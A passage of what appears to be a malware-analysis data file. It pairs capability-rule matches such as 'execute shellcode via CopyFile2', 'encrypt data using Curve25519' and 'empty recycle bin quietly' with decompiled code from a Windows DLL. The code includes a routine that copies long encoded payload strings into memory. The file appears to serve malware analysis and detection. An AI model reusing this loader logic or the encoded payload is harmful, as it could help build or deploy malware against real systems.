0x50;\n                uStack2816 = 0x180041250;\n                uStack2820 = 3;\n                uStack2808 = 0;\n                uStack2792 = 0;\n                uStack2800 = arg1;\n                uStack2784 = (*_sym.imp.USER32.dll_LoadCursorW)(0, 0x7f00);\n                uStack2776 = *0x18008b1c0;\n                uStack2768 = *0x18008b1c8;\n                uStack2760 = 0x180092890;\n                uStack2752 = 0;\n                (*_sym.imp.USER32.dll_RegisterClassExW)(*0x18008b1c0, &uStack2824);\n                iVar2 = fcn.180041330(arg1, 1);\n                if (iVar2 == 0) {\n                    (*_sym.imp.USER32.dll_MessageBoxA)(0, str.FGXDZTRSATFSCwfdv, 0);\n                    (*_sym.imp.ole32.dll_CoUninitialize)();\n                }\n                else {\n                    iVar2 = (*_sym.imp.USER32.dll_GetMessageW)(&uStack2744, 0, 0, 0);\n                    while (iVar2 != 0) {\n                        iVar2 = (*_sym.imp.USER32.dll_TranslateAcceleratorW)\n                                          (CONCAT71(Stack2743, uStack2744), 0, &uStack2744);\n                        if (iVar2 == 0) {\n                            (*_sym.imp.USER32.dll_TranslateMessage)(&uStack2744);\n                            (*_sym.imp.USER32.dll_DispatchMessageW)(&uStack2744);\n                        }\n                        iVar2 = (*_sym.imp.USER32.dll_GetMessageW)(&uStack2744, 0, 0, 0);\n                    }\n                    (*_sym.imp.ole32.dll_CoUninitialize)();\n                }\n            }\n        }\n        else {\n            *0x18009287c = auVar10 & 0x0;\n            *0x18009288c = 0;\n            *0x180092878 = 1;\n            *0x180092870 = arg1;\n            uVar4 = fcn.180041e90(arg1_00, uVar7, arg3, auStack2840[0]);\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            noname_1 = 0;\n            uVar4 = 0;\n            iVar2 = (*_sym.imp.USER32.dll_ShowWindow)();\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            pcVar5 = fcn.180041e90(uVar4, noname_1, auStack2664, 0xa2c);\n            (*pcVar5)(0x180092870);\n        }\n    }\n    fcn.1800024e0(uStack56 ^ auStack2904);\n    return;\n}\n",
        "token_count": 3114
    },
    "1800036e": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001800037b2)\n// WARNING: Removing unreachable block (ram,0x000180003722)\n// WARNING: Removing unreachable block (ram,0x0001800036fb)\n\nulong fcn.1800036e8(ulong noname_0, ulong arg2)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t in_XCR0;\n    \n    piVar1 = cpuid_basic_info(0);\n    uVar6 = 0;\n    puVar2 = cpuid_Version_info(1);\n    uVar4 = puVar2[3];\n    if ((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) {\n        *0x180090028 = 0xffffffffffffffff;\n        uVar5 = *puVar2 & 0xfff3ff0;\n        *0x180090020 = 0x8000;\n        if ((((uVar5 == 0x106c0) || (uVar5 == 0x20660)) || (uVar5 == 0x20670)) ||\n           ((uVar5 - 0x30650 < 0x21 && ((0x100010001U >> (uVar5 - 0x30650 & 0x3f) & 1) != 0)))) {\n            *0x18009140c = *0x18009140c | 1;\n        }\n    }\n    if (6 < *piVar1) {\n        iVar3 = cpuid_Extended_Feature_Enumeration_info(7);\n        uVar6 = *(iVar3 + 4);\n        if ((uVar6 >> 9 & 1) != 0) {\n            *0x18009140c = *0x18009140c | 2;\n        }\n    }\n    *0x180090018 = 1;\n    *0x18009001c = 2;\n    if ((uVar4 >> 0x14 & 1) != 0) {\n        *0x180090018 = 2;\n        *0x18009001c = 6;\n        if ((((uVar4 >> 0x1b & 1) != 0) && ((uVar4 >> 0x1c & 1) != 0)) && ((in_XCR0 & 6) == 6)) {\n            *0x18009001c = 0xe;\n            *0x180090018 = 3;\n            if ((uVar6 & 0x20) != 0) {\n                *0x180090018 = 5;\n                *0x18009001c = 0x2e;\n                if (((uVar6 & 0xd0030000) == 0xd0030000) && ((in_XCR0 & 0xe0) == 0xe0)) {\n                    *0x18009001c = 0x6e;\n                    *0x180090018 = 6;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 739
    },
    "1800040c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar (*) [16] fcn.1800040c0(uchar (*arg1) [16], int32_t *arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    int32_t iVar10;\n    uint uVar11;\n    uint uStack72;\n    uint uStack68;\n    uint uStack60;\n    uint uStack44;\n    uchar auStack40 [16];\n    \n    iVar5 = 0;\n    uStack72 = SUB84(arg2, 0);\n    uStack68 = arg2 >> 0x20;\n    iVar10 = 0;\n    auStack40 = CONCAT412(uStack60, ZEXT812(arg2));\n    iVar6 = 0;\n    uVar11 = uStack60;\n    piVar9 = arg2;\n    fcn.1800044b4(arg2, auStack40);\n    iVar4 = 0;\n    if (*arg2 != 0) {\n        piVar8 = *(arg2 + 2);\n        iVar6 = 0;\n        do {\n            iVar3 = iVar5;\n            if (((*(arg2 + 6) <= arg3) && (arg3 <= *(arg2 + 6) >> 0x20)) &&\n               (iVar10 = iVar4,  uVar11 = uStack60,  iVar3 = iVar4,  iVar6 = iVar4,  piVar9 = arg2,  iVar5 == 0)) {\n                iVar10 = iVar5;\n                iVar3 = iVar5;\n            }\n            iVar5 = iVar3;\n            iVar4 = iVar4 + 1;\n            uVar1 = *((*piVar8 & 0xf) + 0x180046160);\n            puVar7 = piVar8 - *((*piVar8 & 0xf) + 0x180046150);\n            uVar2 = *(puVar7 + -4);\n            *(arg2 + 2) = puVar7;\n            arg2[6] = uVar2 >> (uVar1 & 0x1f);\n            uVar1 = *((*puVar7 & 0xf) + 0x180046160);\n            puVar7 = puVar7 + -*((*puVar7 & 0xf) + 0x180046150);\n            uVar2 = *(puVar7 + -4);\n            *(arg2 + 2) = puVar7;\n            arg2[7] = uVar2 >> (uVar1 & 0x1f);\n            uVar1 = *((*puVar7 & 0xf) + 0x180046160);\n            piVar8 = puVar7 + -*((*puVar7 & 0xf) + 0x180046150);\n            uVar2 = piVar8[-1];\n            *(arg2 + 2) = piVar8;\n            arg2[8] = uVar2 >> (uVar1 & 0x1f);\n            iVar3 = *piVar8;\n            piVar8 = piVar8 + 1;\n            *(arg2 + 2) = piVar8;\n            arg2[9] = iVar3;\n        } while (iVar4 != *arg2);\n    }\n    auStack40 = CONCAT412(uVar11, CONCAT48(iVar10, piVar9));\n    fcn.1800044b4(arg2, auStack40);\n    *arg1 = CONCAT412(uVar11, CONCAT48(iVar10, piVar9));\n    *arg1[1] = uStack72;\n    *(arg1[1] + 4) = uStack68;\n    *(arg1[1] + 8) = iVar6 + 1;\n    *(arg1[1] + 0xc) = uStack44;\n    return arg1;\n}\n",
        "token_count": 894
    },
    "1800057b": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.1800057bc(ulong arg1, ulong arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    uchar auStackX24 [16];\n    \n    piVar1 = fcn.180003e90(arg1, arg2, arg3, auStackX24);\n    return *(*(arg3 + 0x1c) + 4 + *piVar1);\n}\n",
        "token_count": 93
    },
    "1800057f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1800057f4(ulong arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    uchar auStackX24 [16];\n    \n    piVar1 = fcn.180003e90(arg1, arg2, arg3, auStackX24);\n    if (*(*(arg3 + 0x1c) + 4 + *piVar1) < arg4) {\n        *(*(arg3 + 0x1c) + 4 + *piVar1) = arg4;\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "18000577": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.180005770(void)\n\n{\n    if (*0x180090030 != 0xffffffff) {\n        fcn.180011f1c(*0x180090030);\n        *0x180090030 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 61
    },
    "18002413": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.18002413c(void)\n\n{\n    if (*0x180090078 != 0xffffffff) {\n        fcn.18002b544(*0x180090078);\n        *0x180090078 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 61
    },
    "18000da6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nint32_t fcn.18000da64(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar1 = **0x1800914b8;\n    uVar3 = uVar1;\n    if (uVar1 != 0) {\n        if (uVar1 - 0x30 < 10) {\n            *0x1800914b8 = *0x1800914b8 + 1;\n            return uVar3 - 0x2f;\n        }\n        iVar4 = 0;\n        while( true ) {\n            cVar2 = uVar3;\n            if (cVar2 == '@') {\n                *0x1800914b8 = *0x1800914b8 + 1;\n                return iVar4;\n            }\n            if (cVar2 == '\\0') break;\n            if (0xf < cVar2 + 0xbfU) {\n                return -1;\n            }\n            iVar4 = iVar4 * 0x10 + -0x41 + cVar2;\n            *0x1800914b8 = *0x1800914b8 + 1;\n            uVar3 = **0x1800914b8;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 293
    },
    "18000d95": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint64_t fcn.18000d95c(int64_t arg1, int64_t arg2)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    \n    uVar3 = *(arg1 + 0x20);\n    uVar4 = arg2 + 7U & 0xfffffffffffffff8;\n    if (uVar4 == 0) {\n        uVar4 = 8;\n    }\n    if (uVar3 < uVar4) {\n        uVar3 = 0x1000;\n        if (uVar4 < 0x1001) {\n            puVar1 = fcn.1800095c8(0x1008, 0x1800914e0, 1);\n            if (puVar1 != NULL) {\n                *puVar1 = 0;\n                if (*(arg1 + 0x18) == NULL) {\n                    *(arg1 + 0x10) = puVar1;\n                }\n                else {\n                    **(arg1 + 0x18) = puVar1;\n                }\n                *(arg1 + 0x18) = puVar1;\n                goto code_r0x00018000d9c4;\n            }\n        }\n        iVar2 = 0;\n    }\n    else {\ncode_r0x00018000d9c4:\n        *(arg1 + 0x20) = uVar3 - uVar4;\n        iVar2 = *(arg1 + 0x18) + 8 + (uVar3 - uVar4);\n    }\n    return iVar2;\n}\n",
        "token_count": 359
    },
    "18002826": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.180028268(int64_t *arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uchar *in_R8;\n    uint64_t uVar11;\n    uchar *in_R9;\n    int64_t iVar12;\n    int64_t iVar13;\n    ulong uStackX24;\n    int64_t iStackX32;\n    ulong var_50h;\n    ulong var_58h;\n    uchar auStack88 [16];\n    ulong uStack72;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_bp_10h;\n    \n    uVar9 = 0;\n    if (arg2 == NULL) {\n        puVar4 = fcn.180023574();\n        *puVar4 = 0x16;\n        fcn.18001482c();\n        uVar5 = 0x16;\n    }\n    else {\n        *arg2 = 0;\n        iVar6 = *arg1;\n        auStack88 = ZEXT816(0);\n        uStack72 = 0;\n        while (iVar6 != 0) {\n            uStackX24 = CONCAT53(uStackX24._3_5_, 0x3f2a);\n            iVar6 = fcn.1800339c0(iVar6, &uStackX24, in_R8, in_R9);\n            if (iVar6 == 0) {\n                in_R9 = auStack88;\n                in_R8 = NULL;\n                uVar2 = fcn.180027458(*arg1, 0, 0, in_R9);\n            }\n            else {\n                in_R8 = auStack88;\n                uVar2 = fcn.18002776c(*arg1, iVar6, in_R8);\n            }\n            uVar5 = uVar2;\n            if (uVar2 != 0) {\n                goto code_r0x000180027021;\n            }\n            arg1 = arg1 + 1;\n            iVar6 = *arg1;\n        }\n        uStackX24 = 0;\n        iVar6 = (auStack88._8_8_ - auStack88._0_8_ >> 3) + 1;\n        uVar5 = (auStack88._8_8_ - auStack88._0_8_) + 7U >> 3;\n        if (auStack88._8_8_ < auStack88._0_8_) {\n            uVar5 = uVar9;\n        }\n        piVar8 = auStack88._0_8_;\n        uVar10 = uVar9;\n        uVar11 = uVar9;\n        if (uVar5 != 0) {\n            do {\n                iVar7 = -1;\n                do {\n                    iVar7 = iVar7 + 1;\n                } while (*(*piVar8 + iVar7) != '\\0');\n                piVar8 = piVar8 + 1;\n                uVar11 = uVar11 + 1 + iVar7;\n                uVar10 = uVar10 + 1;\n                uStackX24 = uVar11;\n            } while (uVar10 != uVar5);\n        }\n        iVar7 = fcn.1800157c4(iVar6, uStackX24);\n        uVar5 = 0xffffffffffffffff;\n        if (iVar7 != 0) {\n            iVar6 = iVar7 + iVar6 * 8;\n            iStackX32 = iVar6;\n            if (auStack88._0_8_ != auStack88._8_8_) {\n                piVar8 = auStack88._0_8_;\n                do {\n                    iVar12 = -1;\n                    do {\n                        iVar13 = iVar12;\n                        iVar12 = iVar13 + 1;\n                    } while (*(*piVar8 + iVar12) != '\\0');\n                    iVar13 = iVar13 + 2;\n                    iVar3 = fcn.180033848(iStackX32, (iVar6 - iStackX32) + uStackX24, *piVar8, iVar13);\n                    if (iVar3 != 0) {\n                        fcn.18001487c(0, 0, 0, 0, 0);\n                        pcVar1 = swi(3);\n                        uVar9 = (*pcVar1)();\n                        return uVar9;\n                    }\n                    *((iVar7 - auStack88._0_8_) + piVar8) = iStackX32;\n                    iStackX32 = iStackX32 + iVar13;\n                    piVar8 = piVar8 + 1;\n                } while (piVar8 != auStack88._8_8_);\n            }\n            *arg2 = iVar7;\n            uVar5 = uVar9;\n        }\n        fcn.180026378(0);\ncode_r0x000180027021:\n        uVar10 = auStack88._8_8_ + (7 - auStack88._0_8_) >> 3;\n        if (auStack88._8_8_ < auStack88._0_8_) {\n            uVar10 = uVar9;\n        }\n        piVar8 = auStack88._0_8_;\n        if (uVar10 != 0) {\n            do {\n                fcn.180026378(*piVar8);\n                uVar9 = uVar9 + 1;\n                piVar8 = piVar8 + 1;\n            } while (uVar9 != uVar10);\n        }\n        fcn.180026378(auStack88._0_8_);\n        uVar5 = uVar5 & 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 1396
    },
    "18004223": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_bp_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180042230(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    int64_t iVar8;\n    int64_t *piVar9;\n    int64_t *piVar10;\n    int64_t **ppiVar11;\n    int64_t *piVar12;\n    int64_t *piVar13;\n    int64_t **arg2;\n    uchar auStack136 [32];\n    uint uStack104;\n    int64_t **ppiStack96;\n    ulong uStack88;\n    uint uStack80;\n    uint uStack76;\n    int64_t *var_40h;\n    int64_t *var_38h;\n    uint64_t var_30h;\n    ulong var_bp_20h;\n    ulong var_bp_18h;\n    ulong var_bp_10h;\n    \n    var_30h = *0x180090000 ^ auStack136;\n    piVar9 = NULL;\n    uStack104 = 0;\n    *arg1 = NULL;\n    arg1[2] = NULL;\n    arg1[3] = 0xf;\n    *arg1 = 0;\n    ppiStack96 = arg1;\n    piVar6 = fcn.180002500(0x2f17);\n    if (piVar6 == NULL) goto code_r0x0001800437b7;\n    ppiVar11 = piVar6 + 0x27U & 0xffffffffffffffe0;\n    ppiVar11[-1] = piVar6;\n    arg1[2] = 0x2ee0;\n    arg1[3] = 0x2eef;\n    fcn.1800121b0(ppiVar11, \n                  str.OGvOQjxTPkFWVV5ly8gAdYleQj9TPkFSFV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAzTFeQjFMhE9S4VeoFY8BOfx_Flc6TWEiJzECRlZtVVI_LFE8SmEwMH4XQVkgHF9BnAAHiw9MTtLOToKUTFeQj9TPkHSAlWN8AFlzvVoJ4SXCCTp7BHljY0EIrnDYbo3c37ucqj4zFQ1TlEFYwVoVkMOVlNDcAdTFeQm8WPkE201plac9rFjFeQj9TPkFSpV5HFDwCeTFe2D1TPmFSVV5lNDc8sjBeQi9TPkFSVd5kNDcAdSFeQj9RPkFUVV5lNDcAdTdeQj9TPkFSVb5nNDcEdTFeQj9TPEEyVF5lJDcAdTFeQi9TPkFSVV5lNCcAdTFeQj9DPkFSVV5lNDcAdSFeQjThkNSH15lNDcAdTFeQj9TPkFSVV5lNDcApTNeAjFTPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNBl0EEkqQj9TvNlQVV51NDcA7zNeQjtTPkFSVV5lNDcAdTFeQh9TPiF8JzoEQFYAdTtXQj9TjkNSVVRlNDeedzFeQj9TPkFSVV5lNDdAdTEebFsySiBSVV6FMTcAdfFcQj9TPkFSVV5lNDcAdTFeQj9TPkFSFV5l9BlwEVAqIz9Tfk9SVV61NjcAZTFeQpdRPkFSVV5lNDcAdTFeQn9TPgFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQrYfGkkHHdWJfLTsBfYbqob7PkFhlRLoce9I_HSyy3qnQRCnPtlNFxFZUnXBySW1Fa1Ct1yryj7obUrYW4oYXRYL0NDdrMCFpy3pDvzRC_PpinrxFZbgbmvgWLkdmVV7ueSe4tO9vd8iy_6tW3At1tXoQCs7hvb4mLl1Qfr_ucSeJMNGZByfec0FS7XssphOBOCm1POSuvwRKqQ5lNLZNbXAQEVTSS1m6i4Wa83IohXJeQv4FkeTOHZ1tXIoTK2hvb4mFvdfwHKicSfFzFeyXJDyaB5nauXxvpNhdiP66OMgfRd8gJFWgdTHVDyk32qYhLdm_vbpcbgTUr4mLs3hi9rkQSf6ofahXqD9WpSVZ8I5D9rMOFsy3qDVQSCS9cg5I19H9Fw0qDRAFaVZkgFHKedTHVDxk34C4VtcwFLZ1VRygbEfSe2HFTqGatUIgGnN9OrQWHsgWcW7ucRJMRV2yXqDesofRdchEBeLICnnSD9TPqmLH1xlfLTEBWydjvOfdsKTZkhEBdvXjFehXt3GmdvVV6icBMgdyleQlQXGmEA3BpBFHLpFoaZh8htwV2dd8REBckZVtdyXt3HsgWcX6icBMwMCzrLPhXGsPGynGicBMoDodZv_gXGnnRwVFV83MkVV7ZQj_ScmVyqEOfhLZEURET\n                  , 12000);\n    *(ppiVar11 + 0x5dc) = 0;\n    *arg1 = ppiVar11;\n    uStack104 = 1;\n    piVar6 = arg1[2];\n    if (0x7fffffffffffffffU - piVar6 < 12000) goto code_r0x0001800437ab;\n    arg2 = arg1;\n    if (0xf < arg1[3]) {\n        arg2 = ppiVar11;\n    }\n    uStack88 = NULL;\n    piVar10 = piVar6 + 0x5dc;\n    piVar12 = 0xf;\n    piVar7 = &uStack88;\n    piVar13 = uStack88;\n    if (0xf < piVar10) {\n        piVar12 = piVar10 | 0xf;\n        if (piVar12 < 0x8000000000000000) {\n            if (piVar12 < 0x16) {\n                piVar12 = 0x16;\n            }\n            piVar1 = piVar12 + 1;\n            if (piVar1 < 0x1000) {\n                piVar7 = piVar9;\n                piVar13 = piVar9;\n                if (piVar1 != NULL) {\n                    piVar7 = fcn.180002500(piVar1);\n                    piVar13 = piVar7;\n                }\n                goto code_r0x000180042393;\n            }\n            piVar7 = piVar12 + 5;\n            if (piVar7 <= piVar1) goto code_r0x0001800437b1;\n        }\n        else {\n            piVar12 = 0x7fffffffffffffff;\n            piVar7 = 0x8000000000000027;\n        }\n        iVar8 = fcn.180002500(piVar7);\n        if (iVar8 == 0) goto code_r0x0001800437b7;\n        piVar7 = iVar8 + 0x27U & 0xffffffffffffffe0;\n        piVar7[-1] = iVar8;\n        piVar13 = piVar7;\n    }\ncode_r0x000180042393:\n    uStack88 = piVar13;\n    var_40h = piVar10;\n    var_38h = piVar12;\n    fcn.1800121b0(piVar7, arg2, piVar6);\n    fcn.1800121b0(piVar7 + piVar6, \n                  str.AkGjybpjOEFSEdXoHDEAdXXVxx9VPkHZ2GZjNDeJMRVqnmiwb67_FZlNPBF7TVfQjUu2FUVV5lUzcA9IRRD9Tln6hZ9_gFDEAdTOovcAfswTKGdWrX7IgczFeP7bWHkdSVd_QFDEAdbivi3rSi2FUVV5GGjWlsnTe7vRTPvmz1lFbtXKA58heQr4mvsYvV16isQ8GdTEcFz9Tv8xqU15l2sbcvbDrejlTPunzg5aisR8GdTGxhj9T_x6U15lMPalXTdeQjjYs2lUVV6S1fbqcbjLajlTPsDXfVhlNDeMis7f9xdVPkGj3qaa87IwczFe4o9TPsrXZVhlNLoMtbjTcjlTPirXZVhlNCCJ8AFYQjSm3FUVV5mtYIwczFeJxUmOsrXZVhlNL5EUXkWz7qDP0FSHdchEHeL8BlYQj_aemVqHdUglHJMRVuybprOEFS3BpBHLxF9brTYjlTPsgWcX6Nu2cBdbSeTbpCP0FSkttdMjcAbfBeQoda9XzfGdPg5DYAdbDbejlTPpudqqGkmQ8GdTFbw4prOEFS0lplNPCFXTdeQphaPkHZ2HZjNDf3lPC0R7bGFkdSVZ_IHDEAdTSf5xdVPkFV3ttNMjcAD2eoycH3Tb2HZjNDeBwBlYQj89NElSkttVMjcAn9NeQr7WDkdSVZY3NDeLAFYQjk3wnfEJ5O_nJMRVk9ZQ9IC7UNfoBDEAdbDrcjlTPpbwV16isRcGdTFnUz9Tv8RyU15ldKv_irDbYjlTPgQ6VV7kgRcGdTFHSTdTesrfdVhlNLyVRTdeQrTeFkdSVbZkvjYA_vnVxwdVPkFpnStqizYAdTHlsCJTPqhArKGaj7I_dTG3SsaswYbXdVhlNI_wdTGf5x9VPkFUlPtFMjcAfrDrYjlTPsvuJrisR8GdTG8Pz9T_x6U15lPraFXTdeQowFPkGTHZjNDcL9IR2RD9TKQ1WVZngBDEAdbJtQj_Su3FUVV4GOMj_9IRuRD9TCQurqhruuQcGdTHV1xdVPkHZ2H5jNDdM_jSwzz1T1kwKVV7eie0AdXnVstYjxr6tkttNMjcAyIJeQr7mFkdSVeyWA6BBlYQj_sBzCWlPtNMjcAdrDrajlTPhfPNH3kgR8GdTHxMrWbcRiU15lpToAdX3TB__Si3FUVV4fiFvb9IRuRD9TAlg3jpngFDEAdW3SQj_Ss2FUVV56TtrftJxRD9TMcDndVhlNCSfdDHV1x9VPkHZ2G5jNDfoOnJcQnvY_srXfVhlNPCFRTdeQgrcPkHT0G5jNDelQM6hBjyThvKddGvksQcGdTGMWz9Te0KS1OtVMjcA2ehvfgWtoKSVV7kQbsRr9Gw0rbzDBJEN8QvDiu4myZxwdVPkHj5F5ltbI4czFePW9TPsrfbVhlNMDhXvuPqzyZ_6hX3NNdMjcA9IRmRD9TK5hVVZkgtDRfdTGfL79cvzTSIc5jNPCFXTdeQuPfPkE50HZjNDdY_LR2RD9Ttcx6U15ljLIQNzmpo4da9XzffpS03TTKtNhYy7J7OEFS1NtNMjcARuReQr7mFkdSVRiWOzfH8BFYQj9pEFS3tNFMjcAgtCfqDvaq2FU